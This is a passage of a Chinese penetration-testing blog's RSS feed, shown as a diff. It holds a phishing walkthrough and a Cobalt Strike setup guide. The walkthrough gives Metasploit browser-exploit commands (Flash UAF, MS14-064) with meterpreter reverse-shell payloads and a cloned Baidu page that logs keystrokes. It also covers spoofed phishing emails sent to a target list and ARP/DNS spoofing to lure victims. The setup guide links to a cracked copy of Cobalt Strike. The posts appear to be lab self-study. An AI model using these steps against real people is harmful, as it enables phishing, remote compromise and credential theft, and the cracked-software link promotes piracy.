+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/browser/adobe_flash_hacking_team_uaf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_http&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.145&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; disablepayloadhandler &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; prependmigrate &lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;执行后如图所示，会得到一个利用地址，记录该地址：&lt;/p&gt;
+&lt;p&gt;这里使用&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Local IP: http://192.168.199.145:8080/I2bDeFpXx21H&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接下来为了方便钓鱼邮件的内容伪造的真实，我们通过 cobalt strike 克隆一个网站。&lt;/p&gt;
+&lt;p&gt;进入 Web-Drive-by 选项选择 Clone Site。&lt;/p&gt;
+&lt;p&gt;这里提醒下，如果在克隆模块克隆的是 HTTPS 的页面，需要在攻击方加载 SSL 哦，不然没法记录或者执行！(踩坑)&lt;/p&gt;
+&lt;p&gt;其中 attack 就是我们 metasploit 中生成的地址链接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image023.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;克隆成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image024.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;克隆出来的百度&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image025.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;记录的键盘操作&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;克隆出来的百度网页源代码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image027.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;利用 flash 插件漏洞生成的一个克隆链接成功。&lt;/p&gt;
+&lt;p&gt;现在我们进行邮件伪造。&lt;/p&gt;
+&lt;p&gt;kali 下创建目标清单 targets.txt&lt;br /&gt;
+ 注意邮箱和姓名要用 TAB 键隔开，可以是多个邮件地址，每一行一个邮件地址。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image028.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;创建一个钓鱼模板，可以直接下载一个 eml 文件来使用，这个最好还是逼真一点好。&lt;/p&gt;
+&lt;p&gt;配置完毕&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image029.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发送邮件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image030.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;邮件发送成功，如果客户端存在 flash 漏洞，等待点击邮件模板里的链接即可跳转到我们的 http://192.168.199.145/search 地址，并通过 flash 漏洞，获取到该终端的权限，该终端会成功上线。&lt;/p&gt;
+&lt;p&gt;注意：因为邮件服务器和 CS 服务器都是我在本地虚拟机搭建的，不在公网上的。所以暂时未模拟到真实邮件。&lt;/p&gt;
+&lt;h2 id=&#34;metasploit溢出代码与cobalt-strik配合钓鱼&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#metasploit溢出代码与cobalt-strik配合钓鱼&#34;&gt;#&lt;/a&gt; Metasploit 溢出代码与 Cobalt Strik 配合钓鱼&lt;/h2&gt;
+&lt;p&gt;拿的是一个针对 XP 或者以下系统，利用 MS14_064 利用 IE 执行远控木马。 主要还是思路。&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/windows/browser/ms14_064_ole_code_execution&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; srvhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.145&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; SRVPORT &lt;span class=&#34;token number&#34;&gt;6666&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.139&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;生成神秘代码！！&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image031.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们再克隆一下百度，放入 Attack&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image032.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就不勾选键盘记录了，因为直接能控制对方了！&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image033.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;生成了网站链接，至于如何让目标访问这个网站，方法还是很多的，比如给目标来一个 ARP+DNS 欺骗，更改 DNS 解析包，强行让目标访问等。&lt;/p&gt;
+&lt;p&gt;当目标一访问，这边就上线了。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image034.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;不过这 IE 确实不行，我复现的这次 IE 直接裂开了……&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;网上找了个图，凑合着看吧。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image036.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过控制，继续横向渗透即可！&lt;/p&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;p&gt;总结下思路，就是各种模块之间的配合进行简单的钓鱼，知道这些思路后，还可以和别的钓鱼工具配合，或者是别的方法融合！&lt;/p&gt;
+&lt;h1 id=&#34;强化cobalt-strike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#强化cobalt-strike&#34;&gt;#&lt;/a&gt; 强化 Cobalt strike&lt;/h1&gt;
+&lt;p&gt;Cortana 是可以用于 Cobalt strike 以及 Armitage 的脚本，通过加载 cortana 可以向 Cobalt strike 中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制 cortana 脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。&lt;/p&gt;
+&lt;p&gt;扩展：&lt;/p&gt;
+&lt;p&gt;Aggressor Script 是 Cobalt Strike 3.0 版及更高版本中内置的脚本语言。Aggresor 脚本允许您修改和扩展 Cobalt Strike 客户端。&lt;/p&gt;
+&lt;p&gt;Aggressor Script 是 Armitage 中开源脚本引擎 Cortana 的精神继任者。Cortana 是通过 DARPA 的 “网络快速通道” 计划的合同而成为可能的。Cortana 允许其用户通过 Armitage 的团队服务器扩展 Armitage 并控制 Metasploit 框架及其功能。Cobalt Strike 3.0 是对 Cobalt Strike（无 Armitage）基础的完全重写。这一更改提供了重新审视 Cobalt Strike 脚本并围绕 Cobalt Strike 功能构建内容的机会。这项工作的结果是 Aggressor Script。&lt;/p&gt;
+&lt;p&gt;也就是说 Cobalt Strike 3.0 版本之后是 Aggressor。&lt;/p&gt;
+&lt;p&gt;下载 cortana-scripts：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvY29ydGFuYS1zY3JpcHRzLmdpdA==&#34;&gt;https://github.com/rsmudge/cortana-scripts.git&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;beef&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#beef&#34;&gt;#&lt;/a&gt; Beef&lt;/h2&gt;
+&lt;p&gt;Beef 是一款针对浏览器的渗透测试工具，而 beef_strick 则是可以在 Cobalt strike 及 Armitage 中加载 Beef 的一个 Cortana 脚本，要使用此脚本，首先要先下载安装 msf 的 beef 插件。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3hudHJpay9iZWVmbWV0YXNwbG9pdHBsdWdpbi5naXQ=&#34;&gt;https://github.com/xntrik/beefmetasploitplugin.git&lt;/span&gt;&lt;br /&gt;
+cd beefmetasploitplugin&lt;br /&gt;
+cp -R lib/* /usr/share/metasploit-framework/lib/&lt;br /&gt;
+gem install hpricot&lt;br /&gt;
+gem install json&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;安装依赖库，执行：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gem install hpricot&lt;br /&gt;
+gem install json&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;启动 msf 加载 beef&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;msf6 &amp;gt; load beef&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;若遇到此问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这样解决。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cp -R /var/lib/gems/2.7.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里注意若出现以下报错：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;则要结合自己实际情况，例：查看 gems 目录下的文件名、hpricot-x.x.x。&lt;/p&gt;
+&lt;p&gt;现在再启动 msf，就可以加载 beef 了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cs免杀-mac写入内存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cs免杀-mac写入内存&#34;&gt;#&lt;/a&gt; CS 免杀 - MAC 写入内存&lt;/h2&gt;
+&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMTEyNzQ2OTk=&#34;&gt;https://blog.csdn.net/qq_34801745/article/details/111274699&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3NzAyNy9hcnRpY2xlL2RldGFpbHMvMTEwNzIyMzgy&#34;&gt;https://blog.csdn.net/weixin_39677027/article/details/110722382&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL3ppcmMwbi9lc2NiaGcvcXhnZm51&#34;&gt;https://www.yuque.com/zirc0n/escbhg/qxgfnu&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2ludHJhbmV0L0NvYmFsdC1TdHJpa2UuaHRtbA==&#34;&gt;https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuNzcxNjkubmV0L2h0bWwvMjUzMjIxLmh0bWw=&#34;&gt;https://www.77169.net/html/253221.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</guid>
+            <title>CobaltStrike的安装和配置</title>
+            <link>https://or0kit.github.io/PenetrationTest/PostPenetration/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</link>
+            <category>CobaltStrike</category>
+            <pubDate>Tue, 06 Jul 2021 16:58:41 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;Cobalt Strike 是一款内网渗透测试工具，常被业界人称为 CS。Cobalt Strike 2.0 版本主要是结合 Metasploit 可以称为图形化 MSF 工具。而 Cobalt Strike 3.0 已经不再使用 Metasploit 框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在 Windows 以及 Linux 上运行。&lt;br /&gt;
+Cobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等&lt;/p&gt;
+&lt;h1 id=&#34;安装cobaltstrike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装cobaltstrike&#34;&gt;#&lt;/a&gt; 安装 CobaltStrike&lt;/h1&gt;
+&lt;p&gt;有能力的可以支持一下正版 Cobalt Strike 官网: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbQ==&#34;&gt;https://www.cobaltstrike.com&lt;/span&gt;。&lt;/p&gt;
+&lt;p&gt;没有能力我们就用学 (po) 习 (jie) 版。&lt;/p&gt;
+&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWZiMXBTTmZGVWFjT2hxVlQ5b3BsaEE=&#34;&gt;https://pan.baidu.com/s/1fb1pSNfFUacOhqVT9oplhA&lt;/span&gt;&lt;br /&gt;
+ 提取码：rolr&lt;/p&gt;
+&lt;p&gt;这个是 Linux 版本&lt;br /&gt;
+下载解压后文件如下：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;目录结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录结构&#34;&gt;#&lt;/a&gt; 目录结构&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;│  cobaltstrike.jar 【主体程序、客户端启动程序】
+│  teamserver  【Linux服务端启动程序(linux shell脚本)】
+|─third-party 第三方工具 【vnc远程功能的dll】
+|        README.vncdll.txt
+|        winvnc.x64.dll 【vnc服务端dllx64位】
+|        winvnc.x86.dll 【vnc服务端dllx86位】
+│  agscript 【拓展应用的脚本】
+│  c2lint  【检查c2配置文件的语法和预览】
+|  peclone 【用来解析dll】
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;客户端与服务端的连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#客户端与服务端的连接&#34;&gt;#&lt;/a&gt; 客户端与服务端的连接&lt;/h1&gt;
+&lt;p&gt;Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。&lt;/p&gt;
+&lt;h2 id=&#34;启动服务端&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动服务端&#34;&gt;#&lt;/a&gt; 启动服务端&lt;/h2&gt;
+&lt;p&gt;cobaltstrike.jar 既是服务端程序也是客户端程序，一般情况 Linux 用 teamserver 启动服务端。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;teamserver &amp;lt;host&amp;gt; &amp;lt;password&amp;gt; [/path/to/c2.profile] [YYYY-MM-DD]
+
+    &amp;lt;host&amp;gt; is the (default) IP address of this Cobalt Strike team server
+    &amp;lt;password&amp;gt; is the shared password to connect to this server
+    [/path/to/c2.profile] is your Malleable C2 profile
+    [YYYY-MM-DD] is a kill date for Beacon payloads run from this server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第一个参数为服务器监听 IP 地址 此选项为必填选项&lt;/p&gt;
+&lt;p&gt;第二个参数为服务器连接密码客户端使用此密码连接服务器 此选项为必填选项&lt;/p&gt;
+&lt;p&gt;第三个参数为 Malleable C2 profile 配置文件如果不使用可以不用填写 此选项为可选选项&lt;br /&gt;
+这是开源的 Malleable C2 profile 文件&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvTWFsbGVhYmxlLUMyLVByb2ZpbGVz&#34;&gt; https://github.com/rsmudge/Malleable-C2-Profiles&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;第四个参数为 Beacon 有效负载运行结束日期。如果设置此选项则 CS 生成的每个 Beacon stage 中都将嵌入此结束日期，Beacon payload 在此日期后将拒绝运行，处于 sleep 状态的 Beacon payload 醒来后也将自动退出结束运行 此选项为可选选项&lt;/p&gt;
+&lt;p&gt;例:&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;启动客户端&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动客户端&#34;&gt;#&lt;/a&gt; 启动客户端&lt;/h2&gt;
+&lt;p&gt;使用此命令可以直接运行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;为了方便我们把这句话保存在 &lt;code&gt;start.sh&lt;/code&gt;  的 shell 脚本里面。&lt;/p&gt;
+&lt;p&gt;当 Cobalt Strike 客户端启动时，你会看到一个连接对话框&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;输入主机 ip，连接端口 (默认 50050)，以及你想使用的用户名和服务端启动时设置的密码然后点击连接就可以连接到服务器了。&lt;/p&gt;
+&lt;p&gt;点击 Connect 连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击 Yes，随后即可打开 CS 客户端界面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在连接后，团队之间就可以通过客户端进行沟通，信息共享。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
